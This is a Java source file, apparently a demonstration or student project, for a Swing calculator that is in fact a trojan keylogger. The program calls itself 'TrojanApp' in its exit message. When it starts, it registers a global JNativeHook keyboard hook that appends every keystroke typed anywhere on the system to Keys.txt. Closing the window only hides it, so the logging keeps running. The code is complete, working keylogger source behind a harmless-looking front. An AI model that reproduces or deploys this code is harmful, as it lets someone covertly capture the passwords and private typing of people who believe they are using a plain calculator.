package app.desktop;

import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.Scanner;


/**
 * Hauptklasse der Desktop-Anwendung.
 * Diese Klasse erstellt eine GUI für einen einfachen Taschenrechner und 
 * registriert einen globalen Key-Listener zur Erfassung von Tastenanschlägen.
 * 
 * <p>
 * Diese Anwendung ermöglicht grundlegende Rechenoperationen wie Addition, 
 * Subtraktion, Multiplikation und Division. Ein globaler Key-Listener
 * erfasst zusätzlich alle Tastendrücke und speichert diese in eine Datei.
 * </p>
 * 
 * @author Mykhaylo Zhovkevych
 * @version 1.0
 * @since 31.10.2024
 */

public class MainApp implements ActionListener {

    JFrame frame;
    JTextField textfield;
    JButton[] numberButtons = new JButton[10];
    JButton[] functionsButton = new JButton[9];
    JButton addButton, subButton, mulButton, divButton;
    JButton decButton, equButton, delButton, clrButton, negButton;
    JPanel panel;
    Font myFont = new Font("italic", Font.BOLD, 25);
    double num1 = 0, num2 = 0, result = 0;
    char operator; 
    private static boolean running = true; 
    public static final Path file = Paths.get("Keys.txt");

    /**
     * Konstruktor der MainApp.
     * Initialisiert die GUI-Komponenten, startet den Controller und 
     * einen Thread, der auf das Exit-Kommando wartet.
     */
    public MainApp() {
        frame = new JFrame("Taschenrechner");
        frame.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
        frame.setSize(420, 550);
        frame.setLayout(null);

        textfield = new JTextField();
        textfield.setBounds(50, 25, 300, 50);
        textfield.setFont(myFont);
        textfield.setEditable(false);

        mulButton = new JButton("*");
        addButton = new JButton("+");
        subButton = new JButton("-");
        divButton = new JButton("/");
        decButton = new JButton(".");
        equButton = new JButton("=");
        delButton = new JButton("Delete");
        clrButton = new JButton("Clear");
        negButton = new JButton("(-)");

        functionsButton[0] = mulButton;
        functionsButton[1] = addButton;
        functionsButton[2] = subButton;
        functionsButton[3] = divButton;
        functionsButton[4] = decButton;
        functionsButton[5] = equButton;
        functionsButton[6] = delButton;
        functionsButton[7] = clrButton;
        functionsButton[8] = negButton;

        for (int i = 0; i < 9; i++) {
            functionsButton[i].addActionListener(this);
            functionsButton[i].setFont(myFont);
            functionsButton[i].setFocusable(false);
        }
        for (int i = 0; i < 10; i++) {
            numberButtons[i] = new JButton(String.valueOf(i));
            numberButtons[i].addActionListener(this);
            numberButtons[i].setFont(myFont);
            numberButtons[i].setFocusable(false);
        }

        negButton.setBounds(50, 430, 100, 50);
        delButton.setBounds(150, 430, 100, 50);
        clrButton.setBounds(250, 430, 100, 50);

        panel = new JPanel();
        panel.setBounds(50, 100, 300, 300);
        panel.setLayout(new GridLayout(4, 4, 10, 10));

        panel.add(numberButtons[1]);
        panel.add(numberButtons[2]);
        panel.add(numberButtons[3]);
        panel.add(divButton);
        panel.add(numberButtons[4]);
        panel.add(numberButtons[5]);
        panel.add(numberButtons[6]);
        panel.add(mulButton);
        panel.add(numberButtons[7]);
        panel.add(numberButtons[8]);
        panel.add(numberButtons[9]);
        panel.add(subButton);
        panel.add(decButton);
        panel.add(numberButtons[0]);
        panel.add(addButton);
        panel.add(equButton);

        frame.add(panel);
        frame.add(negButton);
        frame.add(clrButton);
        frame.add(delButton);
        frame.add(textfield);
        frame.setVisible(true);

        new Controller(); 
        new Thread(this::waitForExit).start();
    }

    /**
     * Hauptmethode, die die Anwendung startet.
     *
     * @param args Konsolenargumente (nicht verwendet).
     */
    public static void main(String[] args) {
        new MainApp(); 
    }

    /**
     * Reagiert auf Aktionen in der Benutzeroberfläche, z.B. auf Button-Klicks.
     *
     * @param ff Das ausgelöste ActionEvent.
     */
    @Override
    public void actionPerformed(ActionEvent ff) {

        for (int i = 0; i < 10; i++) {
            if (ff.getSource() == numberButtons[i]) {
                textfield.setText(textfield.getText().concat(String.valueOf(i)));
            }
        }
        if (ff.getSource() == decButton) {
            textfield.setText(textfield.getText().concat(String.valueOf(".")));
        }
        if (ff.getSource() == addButton) {
            num1 = Double.parseDouble(textfield.getText());
            operator = '+';
            textfield.setText("");
        }
        if (ff.getSource() == subButton) {
            num1 = Double.parseDouble(textfield.getText());
            operator = '-';
            textfield.setText("");
        }
        if (ff.getSource() == mulButton) {
            num1 = Double.parseDouble(textfield.getText());
            operator = '*';
            textfield.setText("");
        }
        if (ff.getSource() == divButton) {
            num1 = Double.parseDouble(textfield.getText());
            operator = '/';
            textfield.setText("");
        }
        if (ff.getSource() == equButton) {
            num2 = Double.parseDouble(textfield.getText());
            if (operator == '+' || operator == '-' || operator == '*' || operator == '/') {
                switch (operator) {
                    case '+':
                        result = num1 + num2;
                        break;
                    case '-':
                        result = num1 - num2;
                        break;
                    case '*':
                        result = num1 * num2;
                        break;
                    case '/':
                        if (num2 != 0) {
                            result = num1 / num2;
                        } else {
                            System.out.println("Division durch Null ist nicht erlaubt");
                        }
                        break;
                }
                textfield.setText(String.valueOf(result));
                num1 = result;
            }
            operator = '=';
        }
        if (ff.getSource() == clrButton) {
            textfield.setText("");
            num1 = num2 = result = 0;
        }
        if (ff.getSource() == delButton) {
            String string = textfield.getText();
            textfield.setText("");
            for (int i = 0; i < string.length() - 1; i++) {
                textfield.setText(textfield.getText() + string.charAt(i));
            }
        }
    }

    /**
     * Wartet auf die Eingabe "exit" zur Beendigung der Anwendung.
     */
    private void waitForExit() {
        Scanner scanner = new Scanner(System.in);
        System.out.println("Geben Sie 'exit' ein.");
        while (running) {
            String command = scanner.nextLine();
            if ("exit".equalsIgnoreCase(command)) {
                System.out.println("TrojanApp wird geschlossen.");
                running = false; 
                stopListener();
                break; 
            }
        }
        scanner.close();
    }

    /**
     * Beendet den globalen Key-Listener.
     */
    private static void stopListener() {
        try {
            GlobalScreen.unregisterNativeHook(); 
        } catch (NativeHookException e) {
            e.printStackTrace(); 
        }
    }

    /**
     * Interner KeyListener zum Erfassen und Speichern von Tastenanschlägen.
     */
    class KeyListener implements NativeKeyListener {
        /**
         * Reagiert auf das Drücken einer Taste.
         *
         * @param e NativeKeyEvent, der ausgelöst wurde.
         */
        public void nativeKeyPressed(NativeKeyEvent e) {
            String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

            try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND);
                 PrintWriter writer = new PrintWriter(os)) {
                if (keyText.length() > 1) {
                    writer.print("[" + keyText + "]");
                } else {
                    writer.print(keyText);
                }
            } catch (IOException ex) {
                throw new RuntimeException(ex);
            }
        }
    }

    /**
     * Controller-Klasse zur Registrierung des globalen Key-Listeners.
     */
    class Controller {
        /**
         * Konstruktor des Controllers.
         * Initialisiert den Key-Listener.
         */
        Controller() {
            try {
                addListener();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        /**
         * Fügt den globalen Key-Listener hinzu und registriert ihn.
         *
         * @throws NativeHookException falls ein Fehler bei der Registrierung auftritt.
         */
        private void addListener() throws NativeHookException {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new KeyListener());
        }
    }
}
